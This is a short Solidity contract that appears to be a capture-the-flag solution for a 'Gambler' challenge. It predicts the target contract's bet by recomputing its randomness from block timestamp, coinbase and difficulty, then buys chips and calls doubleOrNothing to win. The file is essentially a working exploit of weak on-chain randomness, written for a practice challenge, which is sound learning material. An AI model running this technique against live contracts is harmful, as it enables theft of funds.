// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "../challenges/Gambler/libGambler.sol";
import "../challenges/Gambler/IERC721Receiver.sol";

interface IGambler is IERC721Receiver {
    function buyChips(uint256 numChips) external;

    function getVerified() external payable;

    function doubleOrNothing(address acount, uint256 bet) external;
}

contract GamblerSolution {
    using libGambler for uint256;

    IGambler public gambler;

    function solve(address gambler_) external payable {
        gambler = IGambler(gambler_);

        address account = 0x0000000000000000000000000000000000000000;
        uint256 bet = uint256(keccak256(abi.encodePacked(block.timestamp, block.coinbase, account))) % block.difficulty;

        gambler.buyChips(16);
        gambler.getVerified{ value: 576460752303423488 * 16 }();
        gambler.doubleOrNothing(account, bet);
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return GamblerSolution.onERC721Received.selector;
    }
}
